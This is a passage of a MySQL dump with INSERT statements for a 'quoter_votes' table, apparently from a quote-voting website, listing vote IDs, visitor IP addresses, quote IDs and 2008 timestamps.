  (3428,'81.222.64.10','',0,90,1229129525),
  (3429,'81.222.64.10','',0,91,1229129613),
  (3430,'81.222.64.10','',0,92,1229129703),
  (3431,'81.222.64.10','',0,93,1229129704),
  (3432,'81.222.64.10','',0,94,1229129769),
  (3433,'81.222.64.10','',0,95,1229129771),
  (3434,'81.222.64.10','',0,96,1229129860),
  (3435,'81.222.64.10','',0,97,1229129953),
  (3436,'81.222.64.10','',0,98,1229129954),
  (3437,'81.222.64.10','',0,99,1229130034),
  (3438,'72.30.79.111','',0,56,1229130207),
  (3439,'77.88.30.246','',0,94,1229130356),
  (3440,'77.88.30.246','',0,99,1229130370),
  (3441,'77.88.30.246','',0,90,1229130379),
  (3442,'77.88.30.246','',0,95,1229130386),
  (3443,'91.202.197.79','',0,142,1229130388),
  (3444,'91.202.197.79','',0,141,1229130394),
  (3445,'91.202.197.79','',0,140,1229130401),
  (3446,'77.88.30.246','',0,97,1229130413),
  (3447,'77.88.30.246','',0,89,1229130422),
  (3448,'77.88.30.246','',0,96,1229130445),
  (3449,'77.88.30.246','',0,93,1229130469),
  (3450,'77.88.30.246','',0,92,1229130478),
  (3451,'77.88.30.246','',0,100,1229130488),
  (3452,'77.88.30.246','',0,91,1229130496),
  (3453,'77.88.30.246','',0,98,1229130516),
  (3454,'91.202.197.79','',0,67,1229130589),
  (3455,'91.202.197.79','',0,144,1229130670),
  (3456,'91.202.197.79','',0,133,1229130683),
  (3457,'91.124.29.64','',0,124,1229130861),
  (3458,'91.202.197.79','',0,138,1229131460),
  (3459,'92.112.76.64','',0,141,1229132109),
  (3460,'92.112.76.64','',0,124,1229132279),
  (3461,'92.112.76.64','',0,120,1229132344),
  (3462,'92.112.76.64','',0,115,1229132387),
  (3463,'92.112.76.64','',0,105,1229132443),
  (3464,'67.195.37.113','',0,134,1229132506),
  (3465,'92.112.76.64','',0,80,1229132851),
  (3466,'92.112.76.64','',0,68,1229133028),
  (3467,'72.30.79.35','',0,55,1229133119),
  (3468,'92.112.76.64','',0,29,1229133284),
  (3469,'92.112.76.64','',0,17,1229133373),
  (3470,'92.112.76.64','',0,10,1229133461),
  (3471,'92.112.76.64','',0,9,1229133475),
  (3472,'92.112.76.64','',0,7,1229133495),
  (3473,'80.243.71.189','',0,140,1229133540),
  (3474,'80.243.71.189','',0,55,1229133620),
  (3475,'80.243.71.189','',0,1,1229133622),
  (3476,'80.243.71.189','',0,29,1229133628),
  (3477,'87.225.47.163','',0,144,1229135401),
  (3478,'87.225.47.163','',0,141,1229135420),
  (3479,'87.225.47.163','',0,137,1229135478),
  (3480,'193.93.218.64','',0,141,1229136057),
  (3481,'193.93.218.64','',0,140,1229136195),
  (3482,'87.225.47.163','',0,145,1229139357),
  (3483,'91.185.53.201','',0,145,1229139523),
  (3484,'80.243.71.189','',0,133,1229141507),
  (3485,'80.243.71.189','',0,145,1229141516),
  (3486,'67.195.37.113','',0,139,1229142004),
  (3487,'67.195.37.113','',0,135,1229142516),
  (3488,'67.195.37.113','',0,137,1229142686),
  (3489,'74.6.17.151','',0,3,1229143564),
  (3490,'87.225.47.163','',0,144,1229144123),
  (3491,'67.195.37.113','',0,136,1229144888),
  (3492,'95.56.6.22','',0,55,1229145170),
  (3493,'67.195.37.113','',0,141,1229145850),
  (3494,'66.249.66.47','',0,87,1229147339),
  (3495,'74.6.17.151','',0,62,1229147546),
  (3496,'92.49.175.55','',0,120,1229148592),
  (3497,'89.250.16.246','',0,120,1229148983),
  (3498,'89.250.16.246','',0,55,1229148998),
  (3499,'89.250.16.246','',0,29,1229149070),
  (3500,'67.195.37.113','',0,139,1229150504);
COMMIT;

#
# Data for the `quoter_votes` table  (LIMIT 3500,500)
#

INSERT INTO `quoter_votes` (`id`, `ip`, `useragent`, `value`, `quote_id`, `created`) VALUES 
  (3501,'67.195.37.113','',0,135,1229151676),
  (3502,'66.249.66.47','',0,55,1229152825),
  (3503,'212.46.226.6','',0,97,1229153177),
  (3504,'66.249.66.47','',0,54,1229153292),
  (3505,'66.249.66.47','',0,1,1229153325),
  (3506,'89.111.185.79','',0,106,1229153727),
  (3507,'81.19.66.38','',0,5,1229154220),
  (3508,'66.249.66.47','',0,88,1229154416),
  (3509,'80.73.0.127','',0,145,1229155601),
  (3510,'194.33.189.252','',0,104,1229155833),
  (3511,'89.222.209.22','',0,100,1229156102),
  (3512,'78.24.226.183','',0,55,1229159140),
  (3513,'78.24.226.183','',0,1,1229159142),
  (3514,'78.24.226.183','',0,29,1229159146),
  (3515,'78.139.219.59','',0,141,1229160363),
  (3516,'78.139.219.59','',0,139,1229160390),
  (3517,'78.139.219.59','',0,140,1229160416),
  (3518,'66.249.66.47','',0,56,1229160549),
  (3519,'66.249.66.47','',0,22,1229160679),
  (3520,'89.112.49.75','',0,126,1229160846),
  (3521,'67.195.37.113','',0,143,1229161107),
  (3522,'92.112.1.189','',0,116,1229161727),
  (3523,'79.139.245.85','',0,145,1229162270),
  (3524,'78.139.219.59','',0,120,1229162333),
  (3525,'66.249.66.47','',0,85,1229162336),
  (3526,'91.146.52.99','',0,145,1229162353),
  (3527,'95.31.4.2','',0,125,1229162419),
  (3528,'84.109.97.94','',0,78,1229162696),
  (3529,'84.109.97.94','',0,140,1229162729),
  (3530,'84.109.97.94','',0,137,1229162735),
  (3531,'84.109.97.94','',0,124,1229162755),
  (3532,'74.6.17.176','',0,63,1229163454),
  (3533,'84.109.97.94','',0,120,1229163772),
  (3534,'92.112.1.189','',0,26,1229163880),
  (3535,'195.135.237.18','',0,145,1229164024),
  (3536,'195.135.237.18','',0,119,1229164057),
  (3537,'195.135.237.18','',0,96,1229164120),
  (3538,'195.135.237.18','',0,79,1229164127),
  (3539,'195.135.237.18','',0,56,1229164143),
  (3540,'92.112.1.189','',0,22,1229164386),
  (3541,'81.20.167.28','',0,141,1229165122),
  (3542,'81.20.167.28','',0,140,1229165130),
  (3543,'81.20.167.28','',0,120,1229165290),
  (3544,'81.20.167.28','',0,20,1229165386),
  (3545,'212.80.35.73','',0,146,1229165614),
  (3546,'66.249.66.47','',0,12,1229166455),
  (3547,'66.249.66.47','',0,6,1229166476),
  (3548,'195.46.35.38','',0,85,1229166576),
  (3549,'195.46.35.38','',0,12,1229166671),
  (3550,'89.252.24.189','',0,141,1229166704),
  (3551,'89.252.24.189','',0,133,1229166915),
  (3552,'91.207.146.1','',0,140,1229167002),
  (3553,'91.207.146.1','',0,133,1229167073),
  (3554,'89.252.24.189','',0,127,1229167230),
  (3555,'89.252.24.189','',0,126,1229167248),
  (3556,'89.252.24.189','',0,125,1229167281),
  (3557,'89.252.24.189','',0,124,1229167305),
  (3558,'89.252.24.189','',0,120,1229167382),
  (3559,'212.98.164.146','',0,133,1229167442),
  (3560,'212.98.164.146','',0,124,1229167464),
  (3561,'212.98.164.146','',0,120,1229167472),
  (3562,'212.98.164.146','',0,119,1229167478),
  (3563,'212.98.164.146','',0,117,1229167502),
  (3564,'212.98.164.146','',0,116,1229167515),
  (3565,'212.98.164.146','',0,115,1229167524),
  (3566,'212.98.164.146','',0,114,1229167541),
  (3567,'212.98.164.146','',0,111,1229167582),
  (3568,'212.98.164.146','',0,109,1229167610),
  (3569,'66.249.66.47','',0,56,1229167900),
  (3570,'81.18.116.69','',0,141,1229167974),
  (3571,'81.18.116.69','',0,140,1229167985),
  (3572,'72.30.78.248','',0,144,1229168156),
  (3573,'72.30.78.248','',0,141,1229168200),
  (3574,'72.30.78.248','',0,145,1229168202),
  (3575,'72.30.78.248','',0,146,1229168258),
  (3576,'72.30.78.248','',0,143,1229168310),
  (3577,'72.30.78.248','',0,142,1229168327),
  (3578,'72.30.78.248','',0,137,1229168382),
  (3579,'72.30.78.248','',0,139,1229168397),
  (3580,'72.30.78.248','',0,140,1229168402),
  (3581,'195.112.96.82','',0,116,1229169191),
  (3582,'91.149.189.170','',0,125,1229169194),
  (3583,'66.249.66.47','',0,21,1229169481),
  (3584,'94.50.223.64','',0,101,1229169931),
  (3585,'94.50.223.64','',0,62,1229170293),
  (3586,'212.106.35.8','',0,55,1229170443),
  (3587,'94.50.223.64','',0,56,1229170492),
  (3588,'66.249.66.47','',0,18,1229170584),
  (3589,'212.75.200.39','',0,143,1229170848),
  (3590,'212.75.200.39','',0,141,1229170864),
  (3591,'212.75.200.39','',0,140,1229170877),
  (3592,'86.57.254.230','',0,133,1229171331),
  (3593,'86.57.254.230','',0,101,1229171517),
  (3594,'90.150.243.191','',0,141,1229171994),
  (3595,'217.74.245.234','',0,140,1229172001),
  (3596,'217.74.245.234','',0,148,1229172030),
  (3597,'66.249.66.47','',0,1,1229172235),
  (3598,'88.204.72.214','',0,127,1229172837),
  (3599,'88.204.72.214','',0,99,1229173348),
  (3600,'88.204.72.214','',0,62,1229173378),
  (3601,'87.117.53.5','',0,15,1229173958),
  (3602,'72.30.78.248','',0,50,1229174120),
  (3603,'78.36.134.57','',0,145,1229174244),
  (3604,'94.27.9.18','',0,140,1229176880),
  (3605,'94.181.65.24','',0,129,1229177190),
  (3606,'66.249.66.47','',0,22,1229177389),
  (3607,'66.249.66.47','',0,17,1229177598),
  (3608,'66.249.66.47','',0,6,1229178077),
  (3609,'217.77.54.48','',0,145,1229178876),
  (3610,'87.103.247.33','',0,96,1229179290),
  (3611,'91.198.212.91','',0,10,1229179838),
  (3612,'65.55.105.204','',0,79,1229179865),
  (3613,'77.122.245.211','',0,145,1229180162),
  (3614,'77.122.245.211','',0,148,1229180385),
  (3615,'67.202.43.229','',0,58,1229181908),
  (3616,'92.47.208.93','',0,55,1229181959),
  (3617,'77.90.249.8','',0,55,1229182123),
  (3618,'77.90.249.8','',0,146,1229182565),
  (3619,'67.195.37.113','',0,135,1229182783),
  (3620,'72.30.81.185','',0,54,1229183565),
  (3621,'67.195.37.113','',0,140,1229183826),
  (3622,'66.249.66.47','',0,18,1229184000),
  (3623,'195.189.80.37','',0,144,1229184052),
  (3624,'66.249.66.47','',0,13,1229184061),
  (3625,'87.255.1.67','',0,141,1229184127),
  (3626,'217.25.228.184','',0,56,1229184943),
  (3627,'217.25.228.184','',0,29,1229184954),
  (3628,'212.75.200.39','',0,111,1229185001),
  (3629,'212.75.200.39','',0,109,1229185072),
  (3630,'93.185.182.24','',0,149,1229185517),
  (3631,'212.220.102.134','',0,78,1229185633),
  (3632,'212.75.200.39','',0,87,1229185819),
  (3633,'194.88.211.254','',0,149,1229186241),
  (3634,'194.88.211.254','',0,50,1229186494),
  (3635,'195.19.252.167','',0,131,1229186892),
  (3636,'195.19.252.167','',0,113,1229186921),
  (3637,'195.19.252.167','',0,54,1229186974),
  (3638,'195.19.252.167','',0,27,1229187013),
  (3639,'195.19.252.167','',0,149,1229187041),
  (3640,'195.19.252.167','',0,148,1229187099),
  (3641,'195.19.252.167','',0,145,1229187158),
  (3642,'84.19.181.92','',0,95,1229187919),
  (3643,'92.255.4.11','',0,101,1229187969),
  (3644,'92.124.128.201','',0,149,1229188250),
  (3645,'84.19.181.92','',0,18,1229188268),
  (3646,'85.236.161.131','',0,116,1229188295),
  (3647,'79.171.124.126','',0,142,1229190092),
  (3648,'65.55.105.195','',0,79,1229190169),
  (3649,'79.171.124.126','',0,119,1229190185),
  (3650,'83.167.100.242','',0,140,1229190292),
  (3651,'83.167.100.242','',0,106,1229190360),
  (3652,'67.195.37.113','',0,138,1229190410),
  (3653,'83.167.100.242','',0,101,1229190597),
  (3654,'65.55.107.236','',0,79,1229191076),
  (3655,'79.171.124.126','',0,148,1229191127),
  (3656,'79.171.124.126','',0,99,1229191331),
  (3657,'66.249.66.47','',0,86,1229191435),
  (3658,'66.249.66.47','',0,17,1229191661),
  (3659,'86.4.139.87','',0,16,1229191677),
  (3660,'72.30.81.185','',0,145,1229191793),
  (3661,'78.37.138.90','',0,149,1229192578),
  (3662,'78.37.138.90','',0,148,1229192596),
  (3663,'78.37.138.90','',0,145,1229192622),
  (3664,'78.37.138.90','',0,143,1229192643),
  (3665,'78.106.153.89','',0,140,1229192676),
  (3666,'78.37.138.90','',0,140,1229192707),
  (3667,'93.178.102.169','',0,148,1229192754),
  (3668,'78.37.138.90','',0,133,1229192814),
  (3669,'78.37.138.90','',0,127,1229192832),
  (3670,'78.37.138.90','',0,126,1229192845),
  (3671,'78.37.138.90','',0,124,1229192913),
  (3672,'78.37.138.90','',0,120,1229192921),
  (3673,'195.64.218.44','',0,55,1229193637),
  (3674,'66.249.66.47','',0,81,1229194826),
  (3675,'72.30.81.185','',0,138,1229195788),
  (3676,'94.253.34.48','',0,150,1229195862),
  (3677,'91.201.3.236','',0,111,1229197305),
  (3678,'93.185.182.24','',0,149,1229198740),
  (3679,'93.185.182.24','',0,120,1229198982),
  (3680,'94.248.11.99','',0,28,1229198998),
  (3681,'94.248.11.99','',0,48,1229199198),
  (3682,'65.55.105.208','',0,83,1229199434),
  (3683,'65.55.105.208','',0,88,1229199435),
  (3684,'65.55.105.208','',0,81,1229199436),
  (3685,'65.55.105.208','',0,85,1229199515),
  (3686,'65.55.105.206','',0,84,1229199555),
  (3687,'65.55.105.206','',0,80,1229199663),
  (3688,'65.55.109.143','',0,83,1229199733),
  (3689,'65.55.109.91','',0,88,1229199740),
  (3690,'65.55.109.241','',0,81,1229199761),
  (3691,'65.55.110.99','',0,85,1229199771),
  (3692,'65.55.110.72','',0,80,1229199886),
  (3693,'156.17.237.13','',0,151,1229199920),
  (3694,'194.88.211.114','',0,148,1229200289),
  (3695,'79.171.124.126','',0,151,1229200318),
  (3696,'67.195.37.113','',0,139,1229200333),
  (3697,'195.250.64.76','',0,140,1229200515),
  (3698,'195.250.64.76','',0,93,1229200778),
  (3699,'193.93.12.74','',0,140,1229201315),
  (3700,'78.106.248.18','',0,150,1229201318),
  (3701,'78.106.248.18','',0,144,1229201325),
  (3702,'78.106.248.18','',0,5,1229201491),
  (3703,'78.106.248.18','',0,65,1229201498),
  (3704,'213.149.8.132','',0,151,1229201620),
  (3705,'213.149.8.132','',0,145,1229201641),
  (3706,'193.93.12.74','',0,6,1229202132),
  (3707,'213.149.8.132','',0,142,1229202158),
  (3708,'89.222.133.50','',0,150,1229202223),
  (3709,'213.149.8.132','',0,119,1229202624),
  (3710,'213.149.8.132','',0,96,1229202639),
  (3711,'213.149.8.132','',0,79,1229202692),
  (3712,'213.149.8.132','',0,56,1229202705),
  (3713,'65.55.105.191','',0,83,1229202836),
  (3714,'65.55.105.191','',0,88,1229202836),
  (3715,'65.55.105.191','',0,81,1229202837),
  (3716,'65.55.110.149','',0,83,1229203075),
  (3717,'65.55.105.193','',0,86,1229203618),
  (3718,'65.55.105.193','',0,84,1229203708),
  (3719,'65.55.105.193','',0,80,1229203710),
  (3720,'65.55.110.166','',0,80,1229204062),
  (3721,'65.55.110.41','',0,84,1229204062),
  (3722,'65.55.110.39','',0,86,1229204063),
  (3723,'92.113.141.125','',0,120,1229204073),
  (3724,'79.171.124.126','',0,149,1229204510),
  (3725,'79.171.124.126','',0,127,1229205106),
  (3726,'79.171.124.126','',0,131,1229205912),
  (3727,'65.55.105.205','',0,86,1229205968),
  (3728,'79.171.124.126','',0,125,1229205993),
  (3729,'79.171.124.126','',0,117,1229206049),
  (3730,'80.92.96.29','',0,150,1229206134),
  (3731,'79.171.124.126','',0,116,1229206219),
  (3732,'79.171.124.126','',0,106,1229206297),
  (3733,'94.248.83.42','',0,150,1229206669),
  (3734,'94.248.83.42','',0,149,1229206684),
  (3735,'77.47.180.110','',0,119,1229207007),
  (3736,'194.44.244.174','',0,119,1229207088),
  (3737,'77.47.180.110','',0,56,1229207120),
  (3738,'91.124.209.199','',0,1,1229208150),
  (3739,'91.124.209.199','',0,119,1229208187),
  (3740,'91.124.209.199','',0,155,1229208385),
  (3741,'62.221.123.48','',0,119,1229208761),
  (3742,'156.17.237.13','',0,155,1229209195),
  (3743,'91.200.75.114','',0,120,1229210380),
  (3744,'67.195.37.113','',0,134,1229211251),
  (3745,'89.252.29.43','',0,140,1229211715),
  (3746,'194.88.211.254','',0,151,1229211872),
  (3747,'89.252.29.43','',0,120,1229211981),
  (3748,'85.249.14.253','',0,46,1229212741),
  (3749,'78.36.3.155','',0,159,1229213725),
  (3750,'78.36.3.155','',0,157,1229213769),
  (3751,'78.36.3.155','',0,156,1229213776),
  (3752,'78.36.3.155','',0,155,1229213786),
  (3753,'78.36.3.155','',0,141,1229213942),
  (3754,'78.36.3.155','',0,145,1229213976),
  (3755,'78.36.3.155','',0,55,1229213990),
  (3756,'78.36.3.155','',0,1,1229214004),
  (3757,'78.36.3.155','',0,18,1229214037),
  (3758,'78.36.3.155','',0,93,1229214075),
  (3759,'78.36.3.155','',0,50,1229214125),
  (3760,'91.202.197.79','',0,146,1229214197),
  (3761,'91.202.197.79','',0,150,1229214291),
  (3762,'91.202.197.79','',0,161,1229214364),
  (3763,'91.202.197.79','',0,159,1229214437),
  (3764,'91.202.197.79','',0,155,1229214487),
  (3765,'91.202.197.79','',0,106,1229214811),
  (3766,'87.225.47.163','',0,156,1229218266),
  (3767,'87.225.47.163','',0,155,1229218318),
  (3768,'78.24.226.136','',0,55,1229219504),
  (3769,'78.24.226.136','',0,1,1229219506),
  (3770,'78.24.226.136','',0,29,1229219511),
  (3771,'67.195.37.113','',0,141,1229223940),
  (3772,'72.30.81.185','',0,137,1229225287),
  (3773,'89.107.82.141','',0,55,1229226044),
  (3774,'89.107.82.141','',0,1,1229226045),
  (3775,'89.107.82.141','',0,29,1229226050),
  (3776,'89.188.114.72','',0,155,1229232347),
  (3777,'74.6.22.120','',0,63,1229232524),
  (3778,'89.188.114.72','',0,133,1229232545),
  (3779,'89.188.114.72','',0,131,1229232623),
  (3780,'89.188.114.72','',0,106,1229233357),
  (3781,'87.225.47.163','',0,162,1229234390),
  (3782,'66.249.66.47','',0,78,1229234567),
  (3783,'65.55.105.190','',0,87,1229234775),
  (3784,'65.55.105.190','',0,85,1229234776),
  (3785,'65.55.107.210','',0,87,1229235253),
  (3786,'65.55.109.167','',0,85,1229235254),
  (3787,'217.76.177.222','',0,160,1229235717),
  (3788,'195.20.197.66','',0,161,1229236032),
  (3789,'195.20.197.66','',0,153,1229236104),
  (3790,'195.20.197.66','',0,159,1229236115),
  (3791,'87.225.47.163','',0,163,1229237509),
  (3792,'93.189.52.197','',0,154,1229237714),
  (3793,'93.189.52.197','',0,153,1229237718),
  (3794,'93.189.52.197','',0,155,1229237722),
  (3795,'93.189.52.197','',0,156,1229237729),
  (3796,'93.189.52.197','',0,157,1229237734),
  (3797,'93.189.52.197','',0,159,1229237747),
  (3798,'93.189.52.197','',0,160,1229237752),
  (3799,'93.189.52.197','',0,161,1229237763),
  (3800,'93.189.52.197','',0,163,1229237782),
  (3801,'91.202.197.79','',0,163,1229237795),
  (3802,'62.33.175.193','',0,163,1229237796),
  (3803,'91.124.0.228','',0,160,1229238736),
  (3804,'65.55.105.209','',0,87,1229238997),
  (3805,'65.55.109.34','',0,87,1229239345),
  (3806,'67.202.43.229','',0,44,1229240230),
  (3807,'67.202.43.229','',0,73,1229240245),
  (3808,'66.249.66.47','',0,157,1229242547),
  (3809,'66.249.66.47','',0,155,1229243103),
  (3810,'89.107.82.134','',0,55,1229243375),
  (3811,'89.107.82.134','',0,1,1229243376),
  (3812,'89.107.82.134','',0,29,1229243379),
  (3813,'66.249.66.47','',0,162,1229243689),
  (3814,'92.112.70.117','',0,155,1229243801),
  (3815,'66.249.66.47','',0,153,1229244039),
  (3816,'66.249.66.47','',0,160,1229244127),
  (3817,'66.249.66.47','',0,152,1229244183),
  (3818,'93.85.36.228','',0,61,1229244646),
  (3819,'66.249.66.47','',0,156,1229244661),
  (3820,'217.70.115.124','',0,141,1229244935),
  (3821,'87.255.1.14','',0,141,1229245721),
  (3822,'87.255.1.14','',0,140,1229245783),
  (3823,'95.28.80.117','',0,159,1229246399),
  (3824,'66.249.66.47','',0,159,1229246498),
  (3825,'93.189.52.197','',0,164,1229246587),
  (3826,'87.225.47.163','',0,164,1229246608),
  (3827,'91.202.197.79','',0,153,1229247601),
  (3828,'91.185.51.91','',0,153,1229247659),
  (3829,'81.18.116.69','',0,153,1229247661),
  (3830,'91.202.197.79','',0,164,1229247792),
  (3831,'193.93.218.64','',0,153,1229247965),
  (3832,'91.185.51.91','',0,164,1229248223),
  (3833,'91.185.51.91','',0,162,1229248238),
  (3834,'94.248.84.184','',0,165,1229248496),
  (3835,'94.248.84.184','',0,145,1229248504),
  (3836,'94.248.84.184','',0,119,1229248524),
  (3837,'93.189.52.197','',0,153,1229248675),
  (3838,'87.250.208.77','',0,153,1229248799),
  (3839,'87.250.208.77','',0,12,1229248912),
  (3840,'195.184.215.97','',0,141,1229248985),
  (3841,'89.232.202.210','',0,162,1229249008),
  (3842,'193.93.218.64','',0,162,1229249181),
  (3843,'193.93.218.64','',0,160,1229249189),
  (3844,'87.225.47.163','',0,153,1229249483),
  (3845,'82.193.112.122','',0,106,1229250211),
  (3846,'91.124.0.228','',0,160,1229251728),
  (3847,'93.81.144.240','',0,166,1229253125),
  (3848,'72.30.65.47','',0,146,1229253369),
  (3849,'95.72.62.7','',0,166,1229253475),
  (3850,'77.50.48.102','',0,166,1229253781),
  (3851,'66.249.66.47','',0,161,1229253794),
  (3852,'77.50.48.102','',0,165,1229253806),
  (3853,'77.50.48.102','',0,164,1229253817),
  (3854,'77.50.48.102','',0,163,1229253853),
  (3855,'77.50.48.102','',0,160,1229253878),
  (3856,'81.95.232.144','',0,161,1229253910),
  (3857,'77.50.48.102','',0,145,1229253949),
  (3858,'77.50.48.102','',0,142,1229253973),
  (3859,'77.50.48.102','',0,119,1229253997),
  (3860,'77.50.48.102','',0,56,1229254050),
  (3861,'66.249.66.47','',0,162,1229254158),
  (3862,'91.202.197.79','',0,163,1229254176),
  (3863,'66.249.66.47','',0,159,1229254229),
  (3864,'72.30.65.47','',0,160,1229254638),
  (3865,'72.30.65.47','',0,165,1229254642),
  (3866,'72.30.65.47','',0,162,1229254726),
  (3867,'72.30.65.47','',0,164,1229254727),
  (3868,'72.30.65.47','',0,166,1229254731),
  (3869,'72.30.65.47','',0,159,1229254744),
  (3870,'72.30.65.47','',0,157,1229254818),
  (3871,'193.93.218.64','',0,166,1229254999),
  (3872,'137.195.250.2','',0,156,1229255180),
  (3873,'85.29.194.15','',0,1,1229255210),
  (3874,'85.29.194.15','',0,29,1229255233),
  (3875,'72.30.65.47','',0,161,1229255273),
  (3876,'72.30.65.47','',0,156,1229255273),
  (3877,'85.29.194.15','',0,120,1229255304),
  (3878,'85.29.194.15','',0,109,1229255323),
  (3879,'85.29.194.15','',0,166,1229255480),
  (3880,'85.29.194.15','',0,164,1229255486),
  (3881,'85.29.194.15','',0,160,1229255492),
  (3882,'72.30.65.47','',0,163,1229255991),
  (3883,'93.185.182.24','',0,166,1229256369),
  (3884,'79.165.45.16','',0,164,1229256531),
  (3885,'87.225.47.163','',0,167,1229256608),
  (3886,'87.225.47.163','',0,166,1229256633),
  (3887,'87.225.47.163','',0,163,1229256650),
  (3888,'87.225.47.163','',0,164,1229256654),
  (3889,'87.225.47.163','',0,162,1229256664),
  (3890,'77.122.245.211','',0,166,1229257258),
  (3891,'195.34.238.78','',0,153,1229257417),
  (3892,'80.93.115.10','',0,166,1229257463),
  (3893,'80.93.115.10','',0,167,1229257468),
  (3894,'80.93.115.10','',0,165,1229257500),
  (3895,'85.92.2.203','',0,166,1229257599),
  (3896,'80.93.115.10','',0,164,1229257623),
  (3897,'80.93.115.10','',0,163,1229257644),
  (3898,'87.255.1.67','',0,166,1229257657),
  (3899,'213.187.124.14','',0,161,1229257668),
  (3900,'80.93.115.10','',0,162,1229257682),
  (3901,'80.93.115.10','',0,161,1229257698),
  (3902,'80.93.115.10','',0,160,1229257718),
  (3903,'80.93.115.10','',0,159,1229257753),
  (3904,'80.93.115.10','',0,157,1229257909),
  (3905,'80.93.115.10','',0,156,1229257948),
  (3906,'80.93.115.10','',0,155,1229257976),
  (3907,'80.93.115.10','',0,153,1229257994),
  (3908,'89.151.179.154','',0,166,1229258045),
  (3909,'80.93.115.10','',0,145,1229258085),
  (3910,'91.185.51.91','',0,167,1229258470),
  (3911,'94.178.214.208','',0,167,1229259265),
  (3912,'66.249.66.47','',0,154,1229259384),
  (3913,'94.178.214.208','',0,168,1229259434),
  (3914,'156.17.237.13','',0,167,1229259737),
  (3915,'156.17.237.13','',0,163,1229259798),
  (3916,'77.35.26.139','',0,167,1229260469),
  (3917,'77.35.26.139','',0,160,1229260546),
  (3918,'77.35.26.139','',0,155,1229260595),
  (3919,'77.35.26.139','',0,153,1229260633),
  (3920,'77.35.26.139','',0,145,1229260690),
  (3921,'91.202.197.79','',0,153,1229261163),
  (3922,'193.93.218.64','',0,167,1229261906),
  (3923,'66.249.66.47','',0,13,1229262902),
  (3924,'94.248.84.184','',0,165,1229263039),
  (3925,'77.123.130.163','',0,155,1229263645),
  (3926,'94.31.169.103','',0,164,1229264077),
  (3927,'94.31.169.103','',0,153,1229264500),
  (3928,'94.31.169.103','',0,139,1229264747),
  (3929,'195.34.238.78','',0,153,1229264867),
  (3930,'91.202.197.79','',0,145,1229265272),
  (3931,'91.202.197.79','',0,140,1229265324),
  (3932,'74.6.18.226','',0,120,1229267404),
  (3933,'193.93.218.64','',0,169,1229268195),
  (3934,'193.27.209.200','',0,160,1229268909),
  (3935,'195.189.80.37','',0,155,1229269436),
  (3936,'195.189.80.37','',0,153,1229269469),
  (3937,'91.185.51.91','',0,169,1229269578),
  (3938,'79.171.124.126','',0,169,1229271365),
  (3939,'79.171.124.126','',0,165,1229271396),
  (3940,'79.171.124.126','',0,153,1229271524),
  (3941,'81.18.115.135','',0,168,1229271989),
  (3942,'72.30.78.233','',0,62,1229272419),
  (3943,'66.249.66.47','',0,13,1229273104),
  (3944,'72.30.78.233','',0,161,1229273134),
  (3945,'79.165.45.16','',0,169,1229273248),
  (3946,'91.196.247.117','',0,12,1229273376),
  (3947,'66.249.66.47','',0,155,1229273935),
  (3948,'66.249.66.47','',0,154,1229275551),
  (3949,'212.96.113.139','',0,153,1229276159),
  (3950,'94.248.84.184','',0,165,1229276231),
  (3951,'212.96.113.139','',0,145,1229276245),
  (3952,'81.25.39.91','',0,160,1229276248),
  (3953,'90.188.184.27','',0,160,1229278807),
  (3954,'90.188.184.27','',0,164,1229278843),
  (3955,'79.136.181.45','',0,55,1229279100),
  (3956,'90.188.184.27','',0,157,1229279345),
  (3957,'66.249.66.47','',0,13,1229280375),
  (3958,'90.188.184.27','',0,156,1229280375),
  (3959,'90.188.184.27','',0,154,1229280601),
  (3960,'93.172.195.24','',0,160,1229280688),
  (3961,'90.188.184.27','',0,146,1229280769),
  (3962,'87.249.58.45','',0,160,1229281478),
  (3963,'87.249.58.45','',0,162,1229281499),
  (3964,'87.249.58.45','',0,170,1229281792),
  (3965,'79.165.45.16','',0,170,1229281812),
  (3966,'156.17.237.13','',0,170,1229282171),
  (3967,'156.17.237.13','',0,169,1229282193),
  (3968,'67.195.37.113','',0,137,1229282271),
  (3969,'92.50.208.144','',0,54,1229283484),
  (3970,'87.249.58.45','',0,169,1229283630),
  (3971,'212.98.184.201','',0,164,1229284996),
  (3972,'212.98.184.201','',0,160,1229285071),
  (3973,'79.171.124.126','',0,169,1229285696),
  (3974,'79.171.124.126','',0,160,1229285725),
  (3975,'79.171.124.126','',0,153,1229285789),
  (3976,'212.98.184.201','',0,153,1229286058),
  (3977,'94.51.225.45','',0,172,1229287541),
  (3978,'94.51.225.45','',0,170,1229287563),
  (3979,'217.146.246.12','',0,170,1229288139),
  (3980,'217.146.246.12','',0,169,1229288145),
  (3981,'217.146.246.12','',0,173,1229288386),
  (3982,'94.181.234.54','',0,170,1229288660),
  (3983,'87.249.58.45','',0,173,1229291129),
  (3984,'87.249.58.45','',0,170,1229291153),
  (3985,'87.249.58.45','',0,169,1229291160),
  (3986,'87.249.58.45','',0,162,1229292300),
  (3987,'80.237.112.245','',0,163,1229292311),
  (3988,'80.237.112.245','',0,170,1229292335),
  (3989,'87.249.58.45','',0,153,1229292347),
  (3990,'80.237.112.245','',0,169,1229292359),
  (3991,'80.237.112.245','',0,171,1229292374),
  (3992,'94.248.13.254','',0,165,1229292425),
  (3993,'94.248.13.254','',0,170,1229292441),
  (3994,'156.17.237.13','',0,173,1229293285),
  (3995,'80.237.112.245','',0,174,1229293512),
  (3996,'88.147.248.52','',0,174,1229293735),
  (3997,'82.193.112.122','',0,173,1229293764),
  (3998,'88.147.248.52','',0,172,1229293770),
  (3999,'88.147.248.52','',0,170,1229293788),
  (4000,'82.193.112.122','',0,61,1229293803);
COMMIT;

#
# Data for the `quoter_votes` table  (LIMIT 4000,500)
#

INSERT INTO `quoter_votes` (`id`, `ip`, `useragent`, `value`, `quote_id`, `created`) VALUES 
  (4001,'82.193.112.122','',0,106,1229293809),
  (4002,'79.171.124.126','',0,174,1229293851),
  (4003,'88.147.248.52','',0,55,1229293868),
  (4004,'88.147.248.52','',0,56,1229293919),
  (4005,'66.249.66.47','',0,164,1229294096),
  (4006,'87.249.58.45','',0,174,1229294151),
  (4007,'67.195.37.113','',0,137,1229294171),
  (4008,'94.51.14.53','',0,174,1229294437),
  (4009,'94.51.14.53','',0,169,1229294484),
  (4010,'94.51.14.53','',0,164,1229294506),
  (4011,'80.232.252.109','',0,170,1229294838),
  (4012,'80.232.252.109','',0,164,1229294916),
  (4013,'79.171.124.126','',0,153,1229295274),
  (4014,'156.17.237.13','',0,170,1229297719),
  (4015,'91.202.197.79','',0,153,1229299015),
  (4016,'91.202.197.79','',0,173,1229299096),
  (4017,'91.202.197.79','',0,172,1229299100),
  (4018,'91.202.197.79','',0,170,1229299129),
  (4019,'91.202.197.79','',0,169,1229299204),
